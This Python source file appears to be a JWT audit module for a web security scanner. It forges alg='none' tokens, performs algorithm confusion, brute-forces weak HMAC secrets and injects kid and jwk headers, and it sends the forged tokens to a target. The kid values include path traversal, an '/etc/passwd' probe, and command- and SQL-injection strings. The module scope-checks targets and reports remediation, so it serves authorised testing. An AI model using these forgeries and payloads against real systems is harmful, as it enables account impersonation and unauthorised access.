"""JWT Audit — none algorithm, algorithm confusion, secret brute-force, kid injection."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "test", "key",
    "jwt_secret", "mysecret", "changeme", "qwerty", "abc123",
    "", "null", "undefined", "your-256-bit-secret",
    "your-secret-key", "supersecret", "letmein", "welcome",
    "insecure", "hackme", "token", "jwt", "app_secret",
    "secret_key", "private_key", "auth_secret", "api_key",
]

# kid header injection payloads — path traversal + SQL + OS injection
KID_PAYLOADS: list[tuple[str, str]] = [
    ("/dev/null",            "kid-null-file"),        # Forge with empty key
    ("../../../dev/null",   "kid-traversal-null"),    # Path traversal to null
    ("../../../../dev/null","kid-traversal-deep"),
    ("| cat /dev/null",     "kid-os-injection"),      # OS command injection
    ("' UNION SELECT '",    "kid-sql-injection"),     # SQL injection in kid
    ("/etc/passwd",         "kid-lfi"),               # LFI probe
    ("0",                   "kid-zero"),              # Integer 0 key lookup
]

CVSS_JWT = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS40_JWT = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
def _b64url_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Parse a JWT into (header, payload, signature) or None if invalid."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def forge_none_alg(token: str) -> str | None:
    """Create a 'none' algorithm JWT (no signature)."""
    parsed = parse_jwt(token)
    if not parsed:
        return None
    _, payload, _ = parsed
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def forge_hs256_with_rsa_pubkey(token: str, pubkey_pem: str) -> str | None:
    """Forge HS256 token signed with RSA public key (algorithm confusion attack)."""
    try:
        parsed = parse_jwt(token)
        if not parsed:
            return None
        header, payload, _ = parsed
        new_header = {**header, "alg": "HS256"}
        h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{h}.{p}".encode()
        sig = hmac.new(pubkey_pem.encode(), signing_input, hashlib.sha256).digest()
        return f"{h}.{p}.{_b64url_encode(sig)}"
    except Exception:
        return None


def brute_secret(token: str, wordlist: list[str]) -> str | None:
    """Try to find HMAC secret by brute-force."""
    parsed = parse_jwt(token)
    if not parsed:
        return None
    header, payload, sig = parsed
    alg = header.get("alg", "")
    if alg not in ("HS256", "HS384", "HS512"):
        return None

    hash_fn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }[alg]

    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = _b64url_decode(sig)

    for secret in wordlist:
        candidate = hmac.new(secret.encode(), signing_input, hash_fn).digest()
        if hmac.compare_digest(candidate, expected_sig):
            return secret
    return None


class JwtAudit(BaseModule):
    """JWT security auditor — tests all common JWT attack vectors."""

    NAME        = "jwt_audit"
    DESCRIPTION = "JWT: none algorithm, algorithm confusion, weak secret, kid injection"
    PHASE       = 5
    TAGS        = ["jwt", "auth", "owasp-a02", "cwe-345"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        token = self.config.extra.get("jwt_token")
        if not token:
            self.log.info("No JWT token provided via --jwt-token — skipping JWT audit")
            return self._make_result(start, skipped=True, skip_reason="no token provided")

        self.log.info("Auditing JWT token")
        await self._audit_token(token, target)
        return self._make_result(start)

    async def _audit_token(self, token: str, target: str) -> None:
        parsed = parse_jwt(token)
        if not parsed:
            self.log.warning("Could not parse JWT token")
            return
        header, payload, _ = parsed
        alg = header.get("alg", "")

        # 1. None algorithm attack
        none_token = forge_none_alg(token)
        if none_token:
            await self.rate_limit()
            from webforge.core.session import ForgeSession
            async with ForgeSession(
                rate=self.config.rate.requests_per_second,
                headers={"Authorization": f"Bearer {none_token}"},
            ) as session:
                try:
                    resp = await session.get(target)
                    if resp.status == 200:
                        ev = Evidence(
                            extra={"forged_token": none_token, "original_alg": alg},
                        )
                        self.new_finding(
                            title='JWT "none" Algorithm Accepted',
                            severity=Severity.CRITICAL,
                            description=(
                                'The server accepts JWTs with alg="none", meaning no signature is required. '
                                "An attacker can forge arbitrary tokens and impersonate any user."
                            ),
                            reproduction_steps=[
                                f"Original token: {token[:50]}...",
                                f'Set alg="none" and remove signature: {none_token[:80]}...',
                                "Send Authorization: Bearer <forged_token>",
                                "Observe successful authentication",
                            ],
                            remediation=(
                                'Explicitly whitelist allowed algorithms. Reject "none" algorithm. '
                                "Use a well-maintained JWT library with secure defaults."
                            ),
                            references=["CWE-345", "CVE-2015-9235",
                                        "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_JWT,
                            cvss_v40_vector=CVSS40_JWT,
                            mitre_attack=["TA0004/T1134"],
                            target=target,
                        )
                except Exception:
                    pass

        # 2. Weak secret brute force
        if alg.startswith("HS"):
            secret = brute_secret(token, WEAK_SECRETS)
            if secret:
                ev = Evidence(extra={"secret": secret, "alg": alg})
                self.new_finding(
                    title=f"JWT Weak Secret Found — '{secret}'",
                    severity=Severity.CRITICAL,
                    description=(
                        f"The JWT signing secret is weak: '{secret}'. "
                        "An attacker can forge valid tokens for any user/role."
                    ),
                    reproduction_steps=[
                        f"Token algorithm: {alg}",
                        f"Cracked secret: {secret}",
                        "Forge token with any claims using: python-jwt or jwt.io",
                    ],
                    remediation=(
                        "Use a cryptographically random secret of at least 256 bits. "
                        "Consider switching to RS256 or ES256 (asymmetric keys). "
                        "Rotate the secret immediately."
                    ),
                    references=["CWE-798", "OWASP A02:2021"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_JWT,
                    cvss_v40_vector=CVSS40_JWT,
                    mitre_attack=["TA0006/T1552"],
                    target=target,
                )

        # 3. kid header injection
        await self._test_kid_injection(token, header, payload, target)

        # 4. jwk header injection (embed attacker's public key)
        await self._test_jwk_injection(token, header, payload, target)

        # 5. ES256 / RS256 → HS256 algorithm confusion (public key as HMAC secret)
        if alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
            await self._test_alg_confusion(token, header, payload, alg, target)

        # 6. Information disclosure in payload
        sensitive_claims = ["password", "secret", "key", "admin", "role", "email"]
        found_sensitive = {k: v for k, v in payload.items()
                          if any(s in k.lower() for s in sensitive_claims)}
        if found_sensitive:
            ev = Evidence(extra={"sensitive_claims": found_sensitive})
            self.new_finding(
                title="JWT Contains Sensitive Information in Payload",
                severity=Severity.MEDIUM,
                description=(
                    f"JWT payload contains potentially sensitive claims: {found_sensitive}. "
                    "JWT payloads are base64-encoded, not encrypted — anyone with the token can read them."
                ),
                reproduction_steps=[
                    f"Decode token payload: base64url decode {token.split('.')[1]}",
                    f"Sensitive claims found: {found_sensitive}",
                ],
                remediation=(
                    "Do not store sensitive data in JWT payloads. "
                    "Use JWE (JSON Web Encryption) if sensitive claims are required. "
                    "Store minimal claims in tokens."
                ),
                references=["CWE-312", "OWASP A02:2021"],
                evidence=ev,
                cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                target=target,
            )


    async def _test_kid_injection(
        self, token: str, header: dict, payload: dict, target: str
    ) -> None:
        """Test kid header injection — path traversal and SQL/OS injection."""
        for kid_value, test_name in KID_PAYLOADS:
            injected_header = {**header, "alg": "HS256", "kid": kid_value}
            h = _b64url_encode(json.dumps(injected_header, separators=(",", ":")).encode())
            p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            # Sign with empty key (matches /dev/null content)
            sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
            test_token = f"{h}.{p}.{_b64url_encode(sig)}"

            await self.rate_limit()
            try:
                from webforge.core.session import ForgeSession
                async with ForgeSession(
                    rate=self.config.rate.requests_per_second,
                    headers={"Authorization": f"Bearer {test_token}"},
                ) as session:
                    resp = await session.get(target)
                    if resp and resp.status == 200:
                        ev = Evidence(extra={
                            "kid_payload":    kid_value,
                            "test_name":      test_name,
                            "forged_token":   test_token[:80],
                        })
                        self.new_finding(
                            title=f'JWT kid Header Injection — "{kid_value}" Accepted',
                            severity=Severity.CRITICAL,
                            description=(
                                f'JWT accepted with kid="{kid_value}". '
                                "The server uses the kid header to look up the signing key "
                                "without validation, allowing path traversal, SQL injection, "
                                "or OS command injection to control the key used for verification.\n\n"
                                "With kid='../../../dev/null' (or similar), the key becomes "
                                "an empty string — trivially forgeable."
                            ),
                            reproduction_steps=[
                                f"Set header kid to: {kid_value}",
                                "Sign with empty/null key (HS256)",
                                "Server accepts forged token",
                            ],
                            remediation=(
                                "Validate and sanitize the kid header value. "
                                "Use a static key lookup map (not filesystem paths). "
                                "Never pass kid to file reads, SQL queries, or shell commands."
                            ),
                            references=["CWE-345", "OWASP A02:2021",
                                        "https://portswigger.net/web-security/jwt"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_JWT,
                            cvss_v40_vector=CVSS40_JWT,
                            mitre_attack=["TA0004/T1134"],
                            target=target,
                        )
                        return  # One confirmed finding is enough
            except Exception:
                pass

    async def _test_jwk_injection(
        self, token: str, header: dict, payload: dict, target: str
    ) -> None:
        """Test jwk header injection — embed attacker-controlled public key in header."""
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa, padding
            from cryptography.hazmat.primitives import serialization, hashes
            from cryptography.hazmat.backends import default_backend

            # Generate ephemeral RSA key pair
            priv_key = rsa.generate_private_key(
                public_exponent=65537, key_size=2048, backend=default_backend()
            )
            pub_key = priv_key.public_key()
            pub_numbers = pub_key.public_numbers()

            import base64 as _b64
            def _int_to_b64url(n: int) -> str:
                length = (n.bit_length() + 7) // 8
                return _b64url_encode(n.to_bytes(length, "big"))

            jwk = {
                "kty": "RSA",
                "n": _int_to_b64url(pub_numbers.n),
                "e": _int_to_b64url(pub_numbers.e),
                "alg": "RS256",
                "use": "sig",
            }
            injected_header = {**header, "alg": "RS256", "jwk": jwk}
            h = _b64url_encode(json.dumps(injected_header, separators=(",", ":")).encode())
            p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            signing_input = f"{h}.{p}".encode()
            sig_bytes = priv_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
            test_token = f"{h}.{p}.{_b64url_encode(sig_bytes)}"

            await self.rate_limit()
            from webforge.core.session import ForgeSession
            async with ForgeSession(
                rate=self.config.rate.requests_per_second,
                headers={"Authorization": f"Bearer {test_token}"},
            ) as session:
                resp = await session.get(target)
                if resp and resp.status == 200:
                    ev = Evidence(extra={"attack": "jwk-injection", "token": test_token[:80]})
                    self.new_finding(
                        title='JWT jwk Header Injection — Attacker Public Key Trusted',
                        severity=Severity.CRITICAL,
                        description=(
                            "The server trusts the public key embedded in the JWT's jwk header "
                            "without validating it against a trusted key store. "
                            "An attacker can generate their own RSA keypair, embed the public key "
                            "in the JWT header, and sign with their private key — resulting in "
                            "full token forgery."
                        ),
                        reproduction_steps=[
                            "1. Generate attacker RSA keypair",
                            "2. Embed public key as 'jwk' in JWT header",
                            "3. Sign token with attacker private key",
                            "4. Server verifies against embedded public key → accepted",
                        ],
                        remediation=(
                            "Never use keys from the JWT header itself. "
                            "Maintain a trusted JWKS endpoint or static key config. "
                            "Validate that the key used for verification is in your trust store."
                        ),
                        references=["CVE-2018-0114", "CWE-345"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_JWT,
                        cvss_v40_vector=CVSS40_JWT,
                        mitre_attack=["TA0004/T1134"],
                        target=target,
                    )
        except ImportError:
            self.log.debug("cryptography not installed — skipping jwk injection test")
        except Exception as exc:
            self.log.debug("jwk injection test failed: %s", exc)

    async def _test_alg_confusion(
        self, token: str, header: dict, payload: dict, alg: str, target: str
    ) -> None:
        """RS256/ES256 → HS256 algorithm confusion using public key as HMAC secret."""
        # If we can obtain the public key from the server's JWKS endpoint, use it
        jwks_urls = [
            f"{target.rstrip('/')}/.well-known/jwks.json",
            f"{target.rstrip('/')}/api/.well-known/jwks.json",
            f"{target.rstrip('/')}/auth/jwks",
            f"{target.rstrip('/')}/oauth/jwks",
        ]
        pubkey_pem: str | None = None

        for jwks_url in jwks_urls:
            await self.rate_limit()
            try:
                import aiohttp
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    async with session.get(
                        jwks_url, timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        if resp.status == 200:
                            jwks = await resp.json(content_type=None)
                            keys = jwks.get("keys", [])
                            if keys:
                                # Try to extract public key PEM from first RSA key
                                pubkey_pem = self._jwk_to_pem(keys[0])
                                if pubkey_pem:
                                    break
            except Exception:
                pass

        if not pubkey_pem:
            return

        # Forge HS256 token signed with public key PEM as HMAC secret
        confused_token = forge_hs256_with_rsa_pubkey(token, pubkey_pem)
        if not confused_token:
            return

        await self.rate_limit()
        try:
            from webforge.core.session import ForgeSession
            async with ForgeSession(
                rate=self.config.rate.requests_per_second,
                headers={"Authorization": f"Bearer {confused_token}"},
            ) as session:
                resp = await session.get(target)
                if resp and resp.status == 200:
                    ev = Evidence(extra={
                        "original_alg":  alg,
                        "confused_alg":  "HS256",
                        "jwks_url":      jwks_url,
                        "forged_token":  confused_token[:80],
                    })
                    self.new_finding(
                        title=f'JWT Algorithm Confusion — {alg} → HS256 with Public Key',
                        severity=Severity.CRITICAL,
                        description=(
                            f"JWT algorithm confusion attack succeeded. "
                            f"Server expected {alg} (asymmetric) but accepted HS256 signed "
                            "with the RSA/EC public key as the HMAC secret.\n\n"
                            "An attacker who knows the public key (which is public!) can forge "
                            "valid tokens for any user/role."
                        ),
                        reproduction_steps=[
                            f"Fetch public key from {jwks_url}",
                            f"Change alg from '{alg}' to 'HS256'",
                            "Sign with HMAC-SHA256 using the PEM-encoded public key as the secret",
                            "Server accepts the forged token",
                        ],
                        remediation=(
                            "Explicitly specify the expected algorithm in server-side validation. "
                            "Never allow the client to select the algorithm. "
                            "Use separate key material for HMAC vs asymmetric operations."
                        ),
                        references=["CVE-2016-5431", "CWE-327",
                                    "https://portswigger.net/web-security/jwt/algorithm-confusion"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_JWT,
                        cvss_v40_vector=CVSS40_JWT,
                        mitre_attack=["TA0004/T1134"],
                        target=target,
                    )
        except Exception:
            pass

    def _jwk_to_pem(self, jwk: dict) -> str | None:
        """Convert a JWK (RSA) to PEM-encoded public key string."""
        try:
            from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.backends import default_backend
            import base64

            def _b64url_to_int(s: str) -> int:
                pad = 4 - len(s) % 4
                if pad != 4:
                    s += "=" * pad
                return int.from_bytes(base64.urlsafe_b64decode(s), "big")

            n = _b64url_to_int(jwk["n"])
            e = _b64url_to_int(jwk["e"])
            pub = RSAPublicNumbers(e, n).public_key(default_backend())
            return pub.public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            ).decode()
        except Exception:
            return None


class TestJwtAudit:
    def test_parse_valid_jwt(self) -> None:
        # Fabricated JWT structure (not a real signature)
        token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiSm9obiJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        result = parse_jwt(token)
        assert result is not None
        header, payload, sig = result
        assert header["alg"] == "HS256"
        assert payload["sub"] == "123"

    def test_parse_invalid_jwt(self) -> None:
        assert parse_jwt("not.a.jwt.extra") is None
        assert parse_jwt("invalid") is None

    def test_forge_none_alg(self) -> None:
        token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMifQ.sig"
        result = forge_none_alg(token)
        assert result is not None
        assert result.endswith(".")
        header, _, _ = parse_jwt(result) or ({}, {}, "")
        assert header.get("alg") == "none"

    def test_brute_weak_secret(self) -> None:
        import hmac, hashlib, base64, json
        secret = "secret"
        header  = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(b'{"sub":"test"}').rstrip(b"=").decode()
        signing_input = f"{header}.{payload}".encode()
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        sig_enc = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        token = f"{header}.{payload}.{sig_enc}"
        found = brute_secret(token, WEAK_SECRETS)
        assert found == "secret"
